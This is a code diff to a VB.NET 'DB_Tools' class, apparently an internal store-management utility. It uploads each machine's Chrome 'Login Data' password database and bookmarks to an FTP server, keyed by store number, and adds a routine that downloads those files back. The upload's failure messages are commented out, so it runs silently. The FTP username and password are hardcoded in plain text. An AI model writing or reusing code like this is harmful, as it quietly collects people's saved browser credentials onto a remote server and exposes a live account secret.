@@ -12,6 +12,7 @@ Imports System.Text
 Imports System.Threading
 Imports System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel
 Imports Amazon.Auth.AccessControlPolicy
+Imports Amazon.Runtime.Internal
 Imports Microsoft.Win32
 Imports Newtonsoft.Json.Linq
 Imports SharpCompress.Archives
@@ -674,14 +675,14 @@ Public Class DB_Tools
 
             ' ----- Upload Bookmarks -----
             If IO.File.Exists(bookmarksFile) Then
-                UploadFileToFTP(bookmarksFile, ftpHost & " " & SN.Rows(0)(0).ToString & "_Bookmarks.json", ftpUser, ftpPass)
+                UploadFileToFTP(bookmarksFile, ftpHost & SN.Rows(0)(0).ToString & "_Bookmarks.html", ftpUser, ftpPass)
             Else
                 'MessageBox.Show("Bookmarks file not found.")
             End If
 
             ' ----- Upload Encrypted Password File -----
             If IO.File.Exists(passwordsFile) Then
-                UploadFileToFTP(passwordsFile, ftpHost & " " & SN.Rows(0)(0).ToString & "_LoginData.sqlite", ftpUser, ftpPass)
+                UploadFileToFTP(passwordsFile, ftpHost & SN.Rows(0)(0).ToString & "_LoginData.sqlite", ftpUser, ftpPass)
             Else
                 'MessageBox.Show("Login Data file not found.")
             End If
@@ -712,41 +713,71 @@ Public Class DB_Tools
 
     End Sub
 
-    Public Shared Sub DownloadChromeData()
+    Public Shared Sub DownloadChromeData(download As String)
         Try
             Dim SN As DataTable = GetTableDataFromServer("select storenum from iris.dbo.tblStoreInfo")
 
+            Dim ftpHost As String = "ftp://starcorpus.net/SC-SS-Data/Google_Chrome/"
             Dim ftpUser As String = "bi_admin_ftp@starcorpus.net"
             Dim ftpPass As String = "nsd654159"
-            Dim ftpHostCredentials As String = "ftp://starcorpus.net/SC-SS-Data/Google_Chrome/" & SN.Rows(0)(0).ToString & "_LoginData.sqlite"
+            Dim ftpHostCredentials As String = ftpHost & SN.Rows(0)(0).ToString & "_LoginData.sqlite"
             Dim ftpHostBookmars As String = "ftp://starcorpus.net/SC-SS-Data/Google_Chrome/" & SN.Rows(0)(0).ToString & "_Bookmarks.json"
             Dim localPathCredentials As String = "C:\Temp\ChromeData\" & SN.Rows(0)(0).ToString & "_LoginData.sqlite"
             Dim localPathBookmarks As String = "C:\Temp\ChromeData\" & SN.Rows(0)(0).ToString & "_Bookmarks.json"
 
-            'pending to Mkdir if not exists C:\Temp\ChromeData
+            'create patch if not exist C:\Temp\ChromeData
+            If Not Directory.Exists("C:\Temp\ChromeData") Then
+                Directory.CreateDirectory("C:\Temp\ChromeData")
+            End If
 
             'pending to check if files exists before download
 
-            Using client As New WebClient()
-                client.Credentials = New NetworkCredential(ftpUser, ftpPass)
-                client.DownloadFile(ftpHostCredentials, localPathCredentials)
-                client.DownloadFile(ftpHostBookmars, localPathBookmarks)
-            End Using
+            Select Case download
 
-            MessageBox.Show("Download completed!")
+                Case "Credentials"
+                    'download parameters (credentials file)
+                    Dim request As FtpWebRequest = CType(WebRequest.Create(ftpHostCredentials), FtpWebRequest)
+                    request.Method = WebRequestMethods.Ftp.DownloadFile
+                    request.Credentials = New NetworkCredential(ftpUser, ftpPass)
+                    request.UseBinary = True
+                    request.UsePassive = True   ' VERY important
+                    request.KeepAlive = False
 
-            Dim path As String = "C:\Temp\ChromeData"
+                    'download Google Chrome Credentials file
+                    Using response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
+                        Using responseStream As Stream = response.GetResponseStream()
+                            Using fs As New FileStream(localPathCredentials, FileMode.Create)
+                                responseStream.CopyTo(fs)
+                            End Using
+                        End Using
+                    End Using
 
-            If IO.File.Exists(localPathCredentials) Then
-                Process.Start("explorer.exe", path)
+                Case "Bookmarks"
+                    'download parameters (bookmars file)
+                    Dim request As FtpWebRequest = CType(WebRequest.Create(ftpHostBookmars), FtpWebRequest)
+                    request.Method = WebRequestMethods.Ftp.DownloadFile
+                    request.Credentials = New NetworkCredential(ftpUser, ftpPass)
+                    request.UseBinary = True
+                    request.UsePassive = True   ' VERY important
+                    request.KeepAlive = False
+
+                    'download Google Chrome Bookmarks file
+                    Using response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
+                        Using responseStream As Stream = response.GetResponseStream()
+                            Using fs As New FileStream(localPathBookmarks, FileMode.Create)
+                                responseStream.CopyTo(fs)
+                            End Using
+                        End Using
+                    End Using
+                Case Else
+                    MsgBox("No valid download option selected.")
+                    Return
+            End Select
+
+            If ((IO.File.Exists(localPathCredentials)) Or (IO.File.Exists(localPathBookmarks))) Then
+                Process.Start("explorer.exe", "C:\Temp\ChromeData")
             Else
-                MessageBox.Show("Credentials file not found.")
-            End If
-
-            If IO.File.Exists(localPathBookmarks) Then
-                Process.Start("explorer.exe", path)
-            Else
-                MessageBox.Show("Bookmarks file not found.")
+                MessageBox.Show("File(s) not found.")
             End If
 
         Catch ex As Exception
